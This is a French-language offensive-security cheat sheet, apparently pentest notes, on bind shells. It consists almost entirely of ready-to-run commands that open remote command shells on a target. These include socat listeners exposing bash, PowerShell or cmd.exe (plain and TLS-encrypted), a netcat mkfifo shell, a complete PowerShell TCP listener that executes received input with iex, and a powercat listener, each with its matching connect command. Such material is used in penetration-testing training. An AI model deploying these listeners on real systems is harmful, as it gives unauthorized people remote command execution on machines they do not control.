# Bind shell

Se produisent lorsque le code exécuté sur la cible est utilisé pour démarrer un écouteur attaché à un shell directement sur la cible.

**NB: L'avantage de ne nécessiter aucune configuration sur votre propre réseau, mais peut être empêché par des pare-feu protégeant la cible.**


## Socat

Demarrer un ecouteur de shell 

```sh
socat TCP-L:<PORT> EXEC:"/bin/bash"
```

```sh
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Connecter à l'auditeur en attente

```sh
socat TCP:<TARGET-IP>:<PORT> -
```

### Shell cryptées

Générer un certificat afin d'utiliser des shells cryptés

```sh
openssl req --newkey rsa:2028 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

Fusionner les deux fichiers en un seul 

```sh
cat shell.key shell.crt > shell.pem
```

Demarrer un ecouteur 

```sh
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0,fork EXEC:"/bin/bash"
```

```sh
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0,fork EXEC:cmd.exe,pipes
```

Connecter à l'auditeur en attente:

```sh
socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 -
```

### Shell communes

```sh
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

```sh
nc -nv <TARGET-IP> <PORT>
```

## PowerShell 

Executer ceci dans powershell

```sh
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', '443');
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
	$sendback = (iex $data 2>&1 | Out-String);
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush();
}
$client.Close();
$listener.Stop();
```

```sh
nc -nv <TARGET-IP> 443
```

## PowerCat
C'est la version powershell de netcat

```sh
. .\powercat.ps1
powercat -l -p 9001 -ep -rep -v
```

```sh
nc -nv <TARGET-IP> 9001
```